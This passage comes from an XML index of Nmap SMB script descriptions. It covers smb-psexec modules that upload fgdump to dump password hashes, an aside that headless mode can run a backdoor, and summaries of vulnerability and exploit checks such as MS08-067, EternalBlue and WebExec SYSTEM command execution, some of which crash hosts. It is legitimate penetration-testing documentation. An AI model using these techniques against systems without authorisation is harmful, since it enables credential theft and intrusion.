MAC Address: 00:0C:29:12:E6:DB&#xa;|  |_   IP Address: 192.168.1.21|  Example 3: IP Address and MAC Address&#xa;&lt;/code&gt;&#xa;&#xa;Another interesting part of this script is that variables can be used in any&#xa;script fields. There are two types of variables: built-in and user-supplied.&#xa;Built-in variables can be anything found in the &lt;code&gt;config&lt;/code&gt; table,&#xa;most of which are listed below. The more interesting ones are:&#xa;&#xa;* &lt;code&gt;$lhost&lt;/code&gt;: The address of the scanner&#xa;* &lt;code&gt;$rhost&lt;/code&gt;: The address being scanned&#xa;* &lt;code&gt;$path&lt;/code&gt;: The path where the scripts are uploaded&#xa;* &lt;code&gt;$share&lt;/code&gt;: The share where the script was uploaded&#xa;&#xa;User-supplied arguments are given on the commandline, and can be controlled&#xa;by &lt;code&gt;mod.req_args&lt;/code&gt; in the configuration file. Arguments are given&#xa;by the user in -&#45;script-args; for example, to set $host to &apos;1.2.3.4&apos;, the&#xa;user would pass in -&#45;script-args=host=1.2.3.4. To ensure the user passes in&#xa;the host variable, &lt;code&gt;mod.req_args&lt;/code&gt; would be set to&#xa;&lt;code&gt;{&apos;host&apos;}&lt;/code&gt;.&#xa;&#xa;Here is a module that pings the local ip address:&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = false&#xa;  mod.name             = &quot;Example 4: Can the host ping our address?&quot;&#xa;  mod.program          = &quot;ping.exe&quot;&#xa;  mod.args             = &quot;$lhost&quot;&#xa;  mod.remove           = {&quot;statistics&quot;, &quot;Packet&quot;, &quot;Approximate&quot;, &quot;Minimum&quot;}&#xa;  mod.noblank          = true&#xa;  mod.env              = &quot;SystemRoot=c:\\WINDOWS&quot;&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;And the output:&#xa;&lt;code&gt;&#xa;|  Example 4: Can the host ping our address?&#xa;|  | Pinging 192.168.1.100 with 32 bytes of data:&#xa;|  | Reply from 192.168.1.100: bytes=32 time&lt;1ms TTL=64&#xa;|  | Reply from 192.168.1.100: bytes=32 time&lt;1ms TTL=64&#xa;|  | Reply from 192.168.1.100: bytes=32 time&lt;1ms TTL=64&#xa;|  |_Reply from 192.168.1.100: bytes=32 time&lt;1ms TTL=64&#xa;&lt;/code&gt;&#xa;&#xa;And this module pings an arbitrary address that the user is expected to&#xa;give:&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = false&#xa;  mod.name             = &quot;Example 5: Can the host ping $host?&quot;&#xa;  mod.program          = &quot;ping.exe&quot;&#xa;  mod.args             = &quot;$host&quot;&#xa;  mod.remove           = {&quot;statistics&quot;, &quot;Packet&quot;, &quot;Approximate&quot;, &quot;Minimum&quot;}&#xa;  mod.noblank          = true&#xa;  mod.env              = &quot;SystemRoot=c:\\WINDOWS&quot;&#xa;  mod.req_args         = {&apos;host&apos;}&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;And the output (note that we had to up the timeout so this would complete;&#xa;we&apos;ll talk about override values later):&#xa;&#xa;&lt;code&gt;&#xa;$ ./nmap -n -d -p445 -&#45;script=smb-psexec -&#45;script-args=smbuser=test,smbpass=test,config=examples,host=1.2.3.4 192.168.1.21&#xa;[...]&#xa;|  Example 5: Can the host ping 1.2.3.4?&#xa;|  | Pinging 1.2.3.4 with 32 bytes of data:&#xa;|  | Request timed out.&#xa;|  | Request timed out.&#xa;|  | Request timed out.&#xa;|  |_Request timed out.&#xa;&lt;/code&gt;&#xa;&#xa;For the final example, we&apos;ll use the &lt;code&gt;upload&lt;/code&gt; command to upload&#xa;&lt;code&gt;fgdump.exe&lt;/code&gt;, run it, download its output file, and clean up its&#xa;logfile. You&apos;ll have to put &lt;code&gt;fgdump.exe&lt;/code&gt; in the same folder as&#xa;the script for this to work:&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = true&#xa;  mod.name             = &quot;Example 6: FgDump&quot;&#xa;  mod.program          = &quot;fgdump.exe&quot;&#xa;  mod.args             = &quot;-c -l fgdump.log&quot;&#xa;  mod.url              = &quot;http://www.foofus.net/fizzgig/fgdump/&quot;&#xa;  mod.tempfiles        = {&quot;fgdump.log&quot;}&#xa;  mod.outfile          = &quot;127.0.0.1.pwdump&quot;&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;The &lt;code&gt;-l&lt;/code&gt; argument for fgdump supplies the name of the logfile.&#xa;That file is listed in the &lt;code&gt;mod.tempfiles&lt;/code&gt; field. What, exactly,&#xa;does &lt;code&gt;mod.tempfiles&lt;/code&gt; do?  It simply gives the service a list of&#xa;files to delete while cleaning up. The cleanup process will be discussed&#xa;later.&#xa;&#xa;&lt;code&gt;mod.url&lt;/code&gt; is displayed to the user if &lt;code&gt;mod.program&lt;/code&gt;&#xa;isn&apos;t found in &lt;code&gt;nselib/data/psexec/&lt;/code&gt;. And finally,&#xa;&lt;code&gt;mod.outfile&lt;/code&gt; is the file that is downloaded from the system.&#xa;This is required because fgdump writes to an output file instead of to&#xa;stdout (pwdump6, for example, doesn&apos;t require &lt;code&gt;mod.outfile&lt;/code&gt;.&#xa;&#xa;Now that we&apos;ve seen a few possible combinations of fields, I present a&#xa;complete list of all fields available and what each of them do. Many of them&#xa;will be familiar, but there are a few that aren&apos;t discussed in the examples:&#xa;&#xa;* &lt;code&gt;upload&lt;/code&gt; (boolean) true if it&apos;s a local file to upload, false&#xa;                      if it&apos;s already on the host machine. If&#xa;                      &lt;code&gt;upload&lt;/code&gt; is true, &lt;code&gt;program&lt;/code&gt; has&#xa;                      to be in &lt;code&gt;nselib/data/psexec&lt;/code&gt;.&#xa;* &lt;code&gt;name&lt;/code&gt; (string) The name to display above the output. If this&#xa;                    isn&apos;t given, &lt;code&gt;program&lt;/code&gt; .. &lt;code&gt;args&lt;/code&gt;&#xa;                    are used.&#xa;* &lt;code&gt;program&lt;/code&gt; (string) If &lt;code&gt;upload&lt;/code&gt; is false, the name&#xa;                       (fully qualified or relative) of the program on the&#xa;                       remote system; if &lt;code&gt;upload&lt;/code&gt; is true, the&#xa;                       name of the local file that will be uploaded (stored&#xa;                       in &lt;code&gt;nselib/data/psexec&lt;/code&gt;).&#xa;* &lt;code&gt;args&lt;/code&gt; (string) Arguments to pass to the process.&#xa;* &lt;code&gt;env&lt;/code&gt; (string) Environmental variables to pass to the process,&#xa;                   as name=value pairs, delimited, per Microsoft&apos;s spec, by&#xa;                   NULL characters (&lt;code&gt;string.char(0)&lt;/code&gt;).&#xa;* &lt;code&gt;maxtime&lt;/code&gt; (integer) The approximate amount of time to wait for&#xa;                       this process to complete. The total timeout for the&#xa;                       script before it gives up waiting for a response is&#xa;                       the total of all &lt;code&gt;maxtime&lt;/code&gt; fields.&#xa;* &lt;code&gt;extrafiles&lt;/code&gt; (string[]) Extra file(s) to upload before running&#xa;                          the program. These will not be renamed (because,&#xa;                          presumably, if they are then the program won&apos;t be&#xa;                          able to find them), but they will be marked as&#xa;                          hidden/system/etc. This may cause a race condition&#xa;                          if multiple people are doing this at once, but&#xa;                          there isn&apos;t much we can do. The files are also&#xa;                          deleted afterwards as tempfiles would be. The&#xa;                          files have to be in the same directory as programs&#xa;                          (&lt;code&gt;nselib/data/psexec&lt;/code&gt;), but the program&#xa;                          doesn&apos;t necessarily need to be an uploaded one.&#xa;* &lt;code&gt;tempfiles&lt;/code&gt; (string[]) A list of temporary files that the&#xa;                         process is known to create (if the process does&#xa;                         create files, using this field is recommended&#xa;                         because it helps avoid making a mess on the remote&#xa;                         system).&#xa;* &lt;code&gt;find&lt;/code&gt; (string[]) Only display lines that contain the given&#xa;                    string(s) (for example, if you&apos;re searching for a line&#xa;                    that contains &quot;IP Address&quot;, set this to &lt;code&gt;{&apos;IP&#xa;                    Address&apos;}&lt;/code&gt;. This allows Lua-style patterns, see:&#xa;                    http://lua-users.org/wiki/PatternsTutorial (don&apos;t forget&#xa;                    to escape special characters with a &lt;code&gt;%&lt;/code&gt;).&#xa;                    Note that this is client-side only; the full output is&#xa;                    still returned, the rest is removed while displaying.&#xa;                    The line of output only needs to match one of the&#xa;                    strings given here.&#xa;* &lt;code&gt;remove&lt;/code&gt; (string[]) Opposite of &lt;code&gt;find&lt;/code&gt;; this removes&#xa;                      lines containing the given string(s) instead of&#xa;                      displaying them. Like &lt;code&gt;find&lt;/code&gt;, this is&#xa;                      client-side only and uses Lua-style patterns. If&#xa;                      &lt;code&gt;remove&lt;/code&gt; and &lt;code&gt;find&lt;/code&gt; are in&#xa;                      conflict, then &lt;code&gt;remove&lt;/code&gt; takes priority.&#xa;* &lt;code&gt;noblank&lt;/code&gt; (boolean) Setting this to true removes all blank&#xa;                       lines from the output.&#xa;* &lt;code&gt;replace&lt;/code&gt; (table) A table of values to replace in the strings&#xa;                       returned. Like &lt;code&gt;find&lt;/code&gt; and&#xa;                       &lt;code&gt;replace&lt;/code&gt;, this is client-side only and&#xa;                       uses Lua-style patterns.&#xa;* &lt;code&gt;headless&lt;/code&gt; (boolean) If &lt;code&gt;headless&lt;/code&gt; is set to true,&#xa;                        the program doesn&apos;t return any output; rather, it&#xa;                        runs detached from the service so that, when the&#xa;                        service ends, the program keeps going. This can be&#xa;                        useful for, say, a monitoring program. Or a&#xa;                        backdoor, if that&apos;s what you&apos;re into (a Metasploit&#xa;                        payload should work nicely). Not compatible with:&#xa;                        &lt;code&gt;find&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;,&#xa;                        &lt;code&gt;noblank&lt;/code&gt;, &lt;code&gt;replace&lt;/code&gt;,&#xa;                        &lt;code&gt;maxtime&lt;/code&gt;, &lt;code&gt;outfile&lt;/code&gt;.&#xa;* &lt;code&gt;enabled&lt;/code&gt; (boolean) Set to false, and optionally set&#xa;                       &lt;code&gt;disabled_message&lt;/code&gt;, if you don&apos;t want a&#xa;                       module to run.  Alternatively, you can comment out&#xa;                       the process.&#xa;* &lt;code&gt;disabled_message&lt;/code&gt; (string) Displayed if the module is disabled.&#xa;* &lt;code&gt;url&lt;/code&gt; (string) A module where the user can download the&#xa;                   uploadable file. Displayed if the uploadable file is&#xa;                   missing.&#xa;* &lt;code&gt;outfile&lt;/code&gt; (string) If set, the specified file will be returned&#xa;                       instead of stdout.&#xa;* &lt;code&gt;req_args&lt;/code&gt; (string[]) An array of arguments that the user must&#xa;                        set in &lt;code&gt;-&#45;script-args&lt;/code&gt;.&#xa;&#xa;&#xa;Any field in the configuration file can contain variables, as discussed.&#xa;Here are some of the available built-in variables:&#xa;&#xa;* &lt;code&gt;$lhost&lt;/code&gt;: local IP address as a string.&#xa;* &lt;code&gt;$lport&lt;/code&gt;: local port (meaningless; it&apos;ll change by the time the&#xa;                       module is uploaded since multiple connections are&#xa;                       made).&#xa;* &lt;code&gt;$rhost&lt;/code&gt;: remote IP address as a string.&#xa;* &lt;code&gt;$rport&lt;/code&gt;: remote port.&#xa;* &lt;code&gt;$lmac&lt;/code&gt;: local MAC address as a string in the&#xa;                      xx:xx:xx:xx:xx:xx format (note: requires root).&#xa;* &lt;code&gt;$path&lt;/code&gt;: the path where the file will be uploaded to.&#xa;* &lt;code&gt;$service_name&lt;/code&gt;: the name of the service that will be running&#xa;                              this program&#xa;* &lt;code&gt;$service_file&lt;/code&gt;: the name of the executable file for the&#xa;                              service&#xa;* &lt;code&gt;$temp_output_file&lt;/code&gt;: The (ciphered) file where the programs&apos;&#xa;                                  output will be written before being&#xa;                                  renamed to $output_file&#xa;* &lt;code&gt;$output_file&lt;/code&gt;: The final name of the (ciphered) output file.&#xa;                             When this file appears, the script downloads it&#xa;                             and stops the service&#xa;* &lt;code&gt;$timeout&lt;/code&gt;: The total amount of time the script is going to run&#xa;                         before it gives up and stops the process&#xa;* &lt;code&gt;$share&lt;/code&gt;: The share that everything was uploaded to&#xa;* (script args): Any value passed as a script argument will be replaced (for&#xa;                 example, if Nmap is run with&#xa;                 &lt;code&gt;-&#45;script-args=var3=10&lt;/code&gt;, then &lt;code&gt;$var3&lt;/code&gt;&#xa;                 in any field will be replaced with &lt;code&gt;10&lt;/code&gt;. See the&#xa;                 &lt;code&gt;req_args&lt;/code&gt; field above. Script argument values&#xa;                 take priority over config values.&#xa;&#xa;In addition to modules, the configuration file can also contain overrides.&#xa;Most of these aren&apos;t useful, so I&apos;m not going to go into great detail.&#xa;Search &lt;code&gt;smb-psexec.nse&lt;/code&gt; for any reference to the&#xa;&lt;code&gt;config&lt;/code&gt; table; any value in the &lt;code&gt;config&lt;/code&gt; table can be&#xa;overridden with the &lt;code&gt;overrides&lt;/code&gt; table in the module. The most&#xa;useful value to override is probably &lt;code&gt;timeout&lt;/code&gt;.&#xa;&#xa;Before and after scripts are run, and when there&apos;s an error, a cleanup is&#xa;performed. in the cleanup, we attempt to stop the remote processes, delete&#xa;all programs, output files, temporary files, extra files, etc. A lot of&#xa;effort was put into proper cleanup, since making a mess on remote systems is&#xa;a bad idea.&#xa;&#xa;&#xa;Now that I&apos;ve talked at length about how to use this script, I&apos;d like to&#xa;spend some time talking about how it works.&#xa;&#xa;Running a script happens in several stages:&#xa;&#xa;1. An open fileshare is found that we can write to. Finding an open&#xa;   fileshare basically consists of enumerating all shares and seeing which&#xa;   one(s) we have access to.&#xa;2. A &quot;service wrapper&quot;, and all of the uploadable/extra files, are uploaded.&#xa;   Before they&apos;re uploaded, the name of each file is obfuscated. The&#xa;   obfuscation completely renames the file, is unique for each source system,&#xa;   and doesn&apos;t change between multiple runs. This obfuscation has the benefit&#xa;   of preventing filenames from overlapping if multiple people are running this&#xa;   against the same computer, and also makes it more difficult to determine&#xa;   their purposes. The reason for keeping them consistent for every run is to&#xa;   make cleanup possible: a random filename, if the script somehow fails, will&#xa;   be left on the system.&#xa;3. A new service is created and started. The new service has a random name&#xa;   for the same reason the files do, and points at the &apos;service wrapper&apos;&#xa;   program that was uploaded.&#xa;4. The service runs the processes. One by one, the processes are run and&#xa;   their output is captured. The output is obfuscated using a simple (and&#xa;   highly insecure) xor algorithm, which is designed to prevent casual sniffing&#xa;   (but won&apos;t deter intelligent attackers).  This data is put into a temporary&#xa;   output file. When all the programs have finished, the file is renamed to the&#xa;   final output file&#xa;5. The output file is downloaded, and the cleanup is performced. The file&#xa;   being renamed triggers the final stage of the program, where the data is&#xa;   downloaded and all relevant files are deleted.&#xa;6. Output file, now decrypted, is formatted and displayed to the user.&#xa;&#xa;And that&apos;s how it works!&#xa;&#xa;Please post any questions, or suggestions for better modules, to&#xa;dev@nmap.org.&#xa;&#xa;And, as usual, since this tool can be dangerous and can easily be viewed as&#xa;a malicious tool -&#45; use this responsibly, and don&apos;t break any laws with it.&#xa;&#xa;Some ideas for later versions (TODO):&#xa;&#xa;* Set up a better environment for scripts (&lt;code&gt;PATH&lt;/code&gt;,&#xa;  &lt;code&gt;SystemRoot&lt;/code&gt;, etc). Without this, a lot of programs (especially&#xa;  ones that deal with network traffic) behave oddly.&#xa;* Abstract the code required to run remote processes so other scripts can&#xa;  use it more easily (difficult, but will ultimately be well worth it&#xa;  later).  (May actually not be possible. There is a lot of overhead and&#xa;  specialized code in this module. We&apos;ll see, though.)&#xa;* Let user specify an output file (per-script) so they can, for example,&#xa;  download binary files (don&apos;t think it&apos;s worthwhile).&#xa;* Consider running the external programs in parallel (not sure if the&#xa;  benefits outweigh the drawbacks).&#xa;* Let the config request the return code from the process instead of the&#xa;  output (not sure if doing this would be worth the effort).&#xa;* Check multiple shares in a single session to save packets (and see where&#xa;  else we can tighten up the amount of traffic).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-security-mode.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Returns information about the SMB security level determined by SMB.&#xa;&#xa;Here is how to interpret the output:&#xa;&#xa;* User-level authentication: Each user has a separate username/password that&#xa;  is used to log into the system. This is the default setup of pretty much&#xa;  everything these days.&#xa;* Share-level authentication: The anonymous account should be used to log&#xa;  in, then the password is given (in plaintext) when a share is accessed.&#xa;  All users who have access to the share use this password. This was the&#xa;  original way of doing things, but isn&apos;t commonly seen, now. If a server&#xa;  uses share-level security, it is vulnerable to sniffing.&#xa;* Challenge/response passwords supported: If enabled, the server can accept&#xa;  any type of password (plaintext, LM and NTLM, and LMv2 and NTLMv2).  If it&#xa;  isn&apos;t set, the server can only accept plaintext passwords. Most servers&#xa;  are configured to use challenge/response these days. If a server is&#xa;  configured to accept plaintext passwords, it is vulnerable to sniffing. LM&#xa;  and NTLM are fairly secure, although there are some brute-force attacks&#xa;  against them.  Additionally, LM and NTLM can fall victim to&#xa;  man-in-the-middle attacks or relay attacks (see MS08-068 or my writeup of&#xa;  it: http://www.skullsecurity.org/blog/?p=110.&#xa;* Message signing: If required, all messages between the client and server&#xa;  must be signed by a shared key, derived from the password and the server&#xa;  challenge. If supported and not required, message signing is negotiated&#xa;  between clients and servers and used if both support and request it. By&#xa;  default, Windows clients don&apos;t sign messages, so if message signing isn&apos;t&#xa;  required by the server, messages probably won&apos;t be signed; additionally,&#xa;  if performing a man-in-the-middle attack, an attacker can negotiate no&#xa;  message signing. If message signing isn&apos;t required, the server is&#xa;  vulnerable to man-in-the-middle attacks or SMB-relay attacks.&#xa;&#xa;This script will allow you to use the &lt;code&gt;smb*&lt;/code&gt; script arguments (to&#xa;set the username and password, etc.), but it probably won&apos;t ever require&#xa;them.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-server-stats.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to grab the server&apos;s statistics over SMB and MSRPC, which uses TCP&#xa;ports 445 or 139.&#xa;&#xa;An administrator account is required to pull these statistics on most versions&#xa;of Windows, and Vista and above require UAC to be turned down.&#xa;&#xa;Some of the numbers returned here don&apos;t feel right to me, but they&apos;re definitely&#xa;the numbers that Windows returns. Take the values here with a grain of salt.&#xa;&#xa;These statistics are found using a single call to a SRVSVC function,&#xa;&lt;code&gt;NetServerGetStatistics&lt;/code&gt;. This packet is parsed incorrectly by Wireshark,&#xa;up to version 1.0.3 (and possibly higher).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-system-info.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Pulls back information about the remote system from the registry. Getting all&#xa;of the information requires an administrative account, although a user account&#xa;will still get a lot of it. Guest probably won&apos;t get any, nor will anonymous.&#xa;This goes for all operating systems, including Windows 2000.&#xa;&#xa;Windows Vista disables remote registry access by default, so unless it was enabled,&#xa;this script won&apos;t work.&#xa;&#xa;If you know of more information stored in the Windows registry that could be interesting,&#xa;post a message to the nmap-dev mailing list and I (Ron Bowes) will add it to my todo list.&#xa;Adding new checks to this is extremely easy.&#xa;&#xa;WARNING: I have experienced crashes in &lt;code&gt;regsvc.exe&lt;/code&gt; while making registry calls&#xa;against a fully patched Windows 2000 system; I&apos;ve fixed the issue that caused it,&#xa;but there&apos;s no guarantee that it (or a similar vuln in the same code) won&apos;t show&#xa;up again. Since the process automatically restarts, it doesn&apos;t negatively impact&#xa;the system, besides showing a message box to the user.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-conficker.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Detects Microsoft Windows systems infected by the Conficker worm. This check is dangerous and&#xa;it may crash systems.&#xa;&#xa;Based loosely on the Simple Conficker Scanner, found here:&#xa;-&#45; http://iv.cs.uni-bonn.de/wg/cs/applications/containing-conficker/&#xa;&#xa;This check was previously part of smb-check-vulns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-cve-2017-7494.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Checks if target machines are vulnerable to the arbitrary shared library load&#xa;vulnerability CVE-2017-7494.&#xa;&#xa;Unpatched versions of Samba from 3.5.0 to 4.4.13, and versions prior to&#xa;4.5.10 and 4.6.4 are affected by a vulnerability that allows remote code&#xa;execution, allowing a malicious client to upload a shared library to a writable&#xa;share, and then cause the server to load and execute it.&#xa;&#xa;The script does not scan the version numbers by default as the patches released&#xa;for the mainstream Linux distributions do not change the version numbers.&#xa;&#xa;The script checks the preconditions for the exploit to happen:&#xa;&#xa;1)  If the argument check-version is applied, the script will ONLY check&#xa;    services running potentially vulnerable versions of Samba, and run the&#xa;    exploit against those services. This is useful if you wish to scan a&#xa;    group of hosts quickly for the vulnerability based on the version number.&#xa;    However, because of their version number, some patched versions may still&#xa;    show up as likely vulnerable. Here, we use smb.get_os(host) to do&#xa;    versioning of the Samba version and compare it to see if it is a known&#xa;    vulnerable version of Samba. Note that this check is not conclusive:&#xa;    See 2,3,4&#xa;&#xa;2)  Whether there exists writable shares for the execution of the script.&#xa;    We must be able to write to a file to the share for the exploit to&#xa;    take place. We hence enumerate the shares using&#xa;    smb.share_find_writable(host) which returns the main_name, main_path&#xa;    and a list of writable shares.&#xa;&#xa;3)  Whether the workaround (disabling of named pipes) was applied.&#xa;    When &quot;nt pipe support = no&quot; is configured on the host, the service&#xa;    would not be exploitable. Hence, we check whether this is configured&#xa;    on the host using smb.share_get_details(host, &apos;IPC$&apos;). The error&#xa;    returned would be &quot;NT_STATUS_ACCESS_DENIED&quot; if the workaround is&#xa;    applied.&#xa;&#xa;4)  Whether we can invoke the payloads from the shares.&#xa;    Using payloads from Metasploit, we upload the library files to&#xa;    the writable share obtained from 2). We then make a named pipe request&#xa;    using NT_CREATE_ANDX_REQUEST to the actual local filepath and if the&#xa;    payload executes, the status return will be false. Note that only&#xa;    Linux_x86 and Linux_x64 payloads are tested in this script.&#xa;&#xa;This script is based on the metasploit module written by hdm.&#xa;&#xa;References:&#xa;* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/samba/is_known_pipename.rb&#xa;* https://www.samba.org/samba/security/CVE-2017-7494.html&#xa;* http://blog.nsfocus.net/samba-remote-code-execution-vulnerability-analysis/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-cve2009-3103.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Detects Microsoft Windows systems vulnerable to denial of service (CVE-2009-3103).&#xa;This script will crash the service if it is vulnerable.&#xa;&#xa;The script performs a denial-of-service against the vulnerability disclosed in&#xa;CVE-2009-3103. This works against Windows Vista and some versions of Windows 7,&#xa;and causes a bluescreen if successful. The proof-of-concept code at&#xa;http://seclists.org/fulldisclosure/2009/Sep/39 was used, with one small change.&#xa;&#xa;This check was previously part of smb-check-vulns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms06-025.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Detects Microsoft Windows systems with Ras RPC service vulnerable to MS06-025.&#xa;&#xa;MS06-025 targets the &lt;code&gt;RasRpcSumbitRequest()&lt;/code&gt; RPC method which is&#xa;a part of RASRPC interface that serves as a RPC service for configuring and&#xa;getting information from the Remote Access and Routing service. RASRPC can be&#xa;accessed using either &quot;\ROUTER&quot; SMB pipe or the &quot;\SRVSVC&quot; SMB pipe (usually on Windows XP machines).&#xa;This is in RPC world known as &quot;ncan_np&quot; RPC transport. &lt;code&gt;RasRpcSumbitRequest()&lt;/code&gt;&#xa;method is a generic method which provides different functionalities according&#xa;to the &lt;code&gt;RequestBuffer&lt;/code&gt; structure and particularly the &lt;code&gt;RegType&lt;/code&gt; field within that&#xa;structure. &lt;code&gt;RegType&lt;/code&gt; field is of &lt;code&gt;enum ReqTypes&lt;/code&gt; type. This enum type lists all&#xa;the different available operation that can be performed using the &lt;code&gt;RasRpcSubmitRequest()&lt;/code&gt;&#xa;RPC method. The one particular operation that this vuln targets is the &lt;code&gt;REQTYPE_GETDEVCONFIG&lt;/code&gt;&#xa;request to get device information on the RRAS.&#xa;&#xa;This script was previously part of smb-check-vulns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms07-029.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Detects Microsoft Windows systems with Dns Server RPC vulnerable to MS07-029.&#xa;&#xa;MS07-029 targets the &lt;code&gt;R_DnssrvQuery()&lt;/code&gt; and &lt;code&gt;R_DnssrvQuery2()&lt;/code&gt;&#xa;RPC method which isa part of DNS Server RPC interface that serves as a RPC service&#xa;for configuring and getting information from the DNS Server service.&#xa;DNS Server RPC service can be accessed using &quot;\dnsserver&quot; SMB named pipe.&#xa;The vulnerability is triggered when a long string is send as the &quot;zone&quot; parameter&#xa;which causes the buffer overflow which crashes the service.&#xa;&#xa;This check was previously part of smb-check-vulns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms08-067.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Detects Microsoft Windows systems vulnerable to the remote code execution vulnerability&#xa;known as MS08-067. This check is dangerous and it may crash systems.&#xa;&#xa;On a fairly wide scan conducted by Brandon Enright, we determined&#xa;that on average, a vulnerable system is more likely to crash than to survive&#xa;the check. Out of 82 vulnerable systems, 52 crashed.&#xa;Please consider this before running the script.&#xa;&#xa;This check was previously part of smb-check-vulns.nse.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms10-054.nse">
<categories><category>vuln</category><category>intrusive</category><category>dos</category></categories>
<description>Tests whether target machines are vulnerable to the ms10-054 SMB remote memory&#xa;corruption vulnerability.&#xa;&#xa;The vulnerable machine will crash with BSOD.&#xa;&#xa;The script requires at least READ access right to a share on a remote machine.&#xa;Either with guest credentials or with specified username/password.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms10-061.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Tests whether target machines are vulnerable to ms10-061 Printer Spooler impersonation vulnerability.&#xa;&#xa;This vulnerability was used in Stuxnet worm.  The script checks for&#xa;the vuln in a safe way without a possibility of crashing the remote&#xa;system as this is not a memory corruption vulnerability.  In order for&#xa;the check to work it needs access to at least one shared printer on&#xa;the remote system.  By default it tries to enumerate printers by using&#xa;LANMAN API which on some systems is not available by default. In that&#xa;case user should specify printer share name as printer script&#xa;argument.  To find a printer share, smb-enum-shares can be used.&#xa;Also, on some systems, accessing shares requires valid credentials&#xa;which can be specified with smb library arguments smbuser and&#xa;smbpassword.&#xa;&#xa;References:&#xa;  - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2729&#xa;  - http://technet.microsoft.com/en-us/security/bulletin/MS10-061&#xa;  - http://blogs.technet.com/b/srd/archive/2010/09/14/ms10-061-printer-spooler-vulnerability.aspx&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-ms17-010.nse">
<categories><category>vuln</category><category>safe</category></categories>
<description>Attempts to detect if a Microsoft SMBv1 server is vulnerable to a remote code&#xa; execution vulnerability (ms17-010, a.k.a. EternalBlue).&#xa; The vulnerability is actively exploited by WannaCry and Petya ransomware and other malware.&#xa;&#xa;The script connects to the $IPC tree, executes a transaction on FID 0 and&#xa; checks if the error &quot;STATUS_INSUFF_SERVER_RESOURCES&quot; is returned to&#xa; determine if the target is not patched against ms17-010. Additionally it checks&#xa; for known error codes returned by patched systems.&#xa;&#xa;Tested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016.&#xa;&#xa;References:&#xa;* https://technet.microsoft.com/en-us/library/security/ms17-010.aspx&#xa;* https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/&#xa;* https://msdn.microsoft.com/en-us/library/ee441489.aspx&#xa;* https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb&#xa;* https://github.com/cldrn/nmap-nse-scripts/wiki/Notes-about-smb-vuln-ms17-010&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-regsvc-dos.nse">
<categories><category>intrusive</category><category>exploit</category><category>dos</category><category>vuln</category></categories>
<description>Checks if a Microsoft Windows 2000 system is vulnerable to a crash in regsvc caused by a null pointer&#xa;dereference. This check will crash the service if it is vulnerable and requires a guest account or&#xa;higher to work.&#xa;&#xa;The vulnerability was discovered by Ron Bowes while working on &lt;code&gt;smb-enum-sessions&lt;/code&gt; and&#xa;was reported to Microsoft (Case #MSRC8742).&#xa;&#xa;This check was previously part of smb-check-vulns.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-vuln-webexec.nse">
<categories><category>intrusive</category><category>vuln</category></categories>
<description>Checks whether the WebExService is installed and allows us to run code.&#xa;&#xa;Note: Requires a user account (local or domain).&#xa;&#xa;References:&#xa;* https://www.webexec.org&#xa;* https://blog.skullsecurity.org/2018/technical-rundown-of-webexec&#xa;* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15442&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-webexec-exploit.nse">
<categories><category>intrusive</category><category>exploit</category></categories>
<description>Attempts to run a command via WebExService, using the WebExec vulnerability.&#xa;Given a Windows account (local or domain), this will start an arbitrary&#xa;executable with SYSTEM privileges over the SMB protocol.&#xa;&#xa;The argument webexec_command will run the command directly. It may or may not&#xa;start with a GUI. webexec_gui_command will always start with a GUI, and is&#xa;useful for running commands such as &quot;cmd.exe&quot; as SYSTEM if you have access.&#xa;&#xa;References:&#xa;* https://www.webexec.org&#xa;* https://blog.skullsecurity.org/2018/technical-rundown-of-webexec&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb2-capabilities.nse">
<categories><category>safe</category><category>discovery</category></categories>
